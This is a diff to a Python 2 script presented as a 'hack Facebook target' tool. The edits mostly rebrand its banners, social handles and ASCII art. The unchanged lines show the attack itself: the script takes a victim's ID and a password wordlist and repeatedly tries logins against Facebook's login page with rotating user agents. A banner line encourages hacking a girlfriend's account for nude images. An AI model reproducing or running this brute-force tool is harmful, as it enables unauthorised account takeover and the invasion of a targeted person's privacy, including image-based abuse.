@@ -1,7 +1,7 @@
 #!usr
 # -*- coding: UTF-8 -*-
-# Mod by: ShymonHasan
-# team: life of programmer
+# Creator by: ShymonHasan
+# Facebook: Shymon Hasan
 
 
 import os
@@ -36,35 +36,35 @@ def runntxt(s):
 def banner():
     os.system('clear')
     print " "
-    runntxt(GL+"              Assalamu'@laikum. ^_^")
-    runntxt(WW+"   ..................  ANDA MENCOBA MENGHUBUNGI")
-    runntxt(WW+"     ....       ShymonHasan")
-    runntxt(GL+"                   BODO AMAT CUK")
-    runntxt(GG+"     ..........     MANDI DULU SANA")
-    runntxt(Y+"    ............       DILARANG CO*I")
-    runntxt(GG+"           INGAT COK ")
+    runntxt(GL+"              Assalamu'Wlaikum. ^_^")
+    runntxt(WW+"   ........... Hack Target Id")
+    runntxt(WW+"     .... Fb:     Shymon Hasan")
+    runntxt(GL+"      Youtube:      Feelings Creation")
+    runntxt(GG+"     ....Instagram:  👑RaFiN Chowdhury💫")
+    runntxt(Y+"    ............Nick:    SH Rafin")
+    runntxt(GG+"    Github: https://github.com/ShymonHasan ")
     time.sleep(1.5)
     print GG+"  √=============================================√"
     print GL+"  |••••••   NEW TOOLS HACK FACEBOOK GF.   ••••••|"
     print GG+"  √=============================================√"
-    print WW+"  |            MOD BY: ShymonHasan             |"
-    print GL+"  |       Facebook: https://www.facebook.com/I.FueK.YoUr.MiNd.BnXD       |"
-    print WW+"  |      Youtube: https://www.youtube.com/channel/UCpedCBaRzoGyTQIJaJrD3tQ           |"
-    print Y+"  |             INSTAGRAM: 👑RaFiN Chowdhury💫              |"
+    print WW+"  |            MOD BY: ShymonHasan              |"
+    print GL+"  |       Facebook: I.FueK.YoUr.MiNd.BnXD       |"
+    print WW+"  |      Youtube: 𝐹𝐸𝐸𝐿𝐼𝑁𝐺𝑆 𝐶𝑅𝐸𝐴𝑇𝐼𝑂𝑁            |"
+    print Y+"   |            INSTAGRAM: 👑RaFiN Chowdhury💫   |"
     print GL+"  |---------------------------------------------|"
     print GL+"  |        LIFE OF PROGRAMMER [ L.O.P ]         |"
     print GL+"  |---------------------------------------------|"
     print GG+"  √=============================================√"
-    print GL+"  |•••••••••   HACK FACEBOOK MAS ^_^   •••••••••|"
+    print GL+"  |•••••••••   HACK FACEBOOK TARGET^_^ •••••••••|"
     print GG+"  √=============================================√"
 
 banner()
 
-print wd+"         gunakan dengan bijak cok "
-print GG+"╭────\033[91m[\033[96m Masukkan ID\033[95m / \033[96mUsername Target\033[91m ] "
+print wd+"         Hack Kore Gf Ar Nudos Dis Vai "
+print GG+"╭────\033[91m[\033[96m Target ID\033[95m / \033[96mUsername Target\033[91m ] "
 email_target = str(raw_input(GL+"\033[92m╰────➲\033[93m  "))
 print " "
-print "\033[92m╭────\033[91m[ \033[96mMasukkan File Wordlist \033[95m( pass.txt ) \033[91;1m]"
+print "\033[92m╭────\033[91m[ \033[96mPass Wordlist \033[95m( SH.Rafin.txt ) \033[91;1m]"
 password_list = str(raw_input(GG+"╰────➲\033[93m "))
 login = 'https://www.facebook.com/login.php?login_attempt=1'
 useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
@@ -114,7 +114,7 @@ def main():
         print " "
 def iqbalz(iqbalz_password):
   try:
- 	sys.stdout.write(GG+"\n[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m Mencoba ==> \033[91m[\033[90;1m"+iqbalz_password)
+ 	sys.stdout.write(GG+"\n[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m Wrong ==> \033[91m[\033[90;1m"+iqbalz_password)
 	sys.stdout.flush()
 	noobs.addheaders = [('User-agent', random.choice(useragents))]
 	site = noobs.open(login)
@@ -158,7 +158,18 @@ def runn_noobs():
         -s/`  .-..`            `..--` `/s-
        /o.   `:.`.-:----------:-.``:-   .o/
       /o`    .:`    `              --    `o/
-     -s.     .:`                   --     .s-
+     -s.     .:`    
+     -M            
+     -J     --
+     /R
+     -S    --
+     -J
+    -M     .:       ╭━━━┳╮╱╭╮
+    -R              ┃╭━╮┃┃╱┃┃     --
+    -J     ':       ┃╰━━┫╰━╯┃     --
+     M              ╰━━╮┃╭━╮┃     --
+    .R     .:       ┃╰━╯┃┃╱┃┃     --
+    .S              ╰━━━┻╯╱╰╯     --     .s-
      o/     .:`                     --     +o
     .s-     :.                      `:`    -s`
     .s.     :.                      `:`    .s.
@@ -173,7 +184,7 @@ def runn_noobs():
               `-/+///..````..://+/-`
                   `.-::////::-.` \033[91;1m
 
-                \033[90;1mLife Of Programmer\033[91;1m
+                \033[90;1mSub:𝐹𝐸𝐸𝐿𝐼𝑁𝐺𝑆 𝐶𝑅𝐸𝐴𝑇𝐼𝑂𝑁\033[91;1m
              Powered by:\033[97m ShymonHasan
       """
 
@@ -182,8 +193,8 @@ def runn_noobs():
          nuub = open(password_list, 'r')
          nuub = nuub.readlines()
          print wd+" [#] ID / Username Target\033[97;1m: {}".format(email_target)
-         print wd+" [#] JUmlah Password saat ini\033[97;1m:", len(nuub),'password'
-         print wd+" [#] Tunggu Proses Cracking\033[97;1m.........."
+         print wd+" [#] SH Password saat ini\033[97;1m:", len(nuub),'password'
+         print wd+" [#] Target Proses Cracking\033[97;1m.........."
          print " "
 
 if __name__=='__main__':
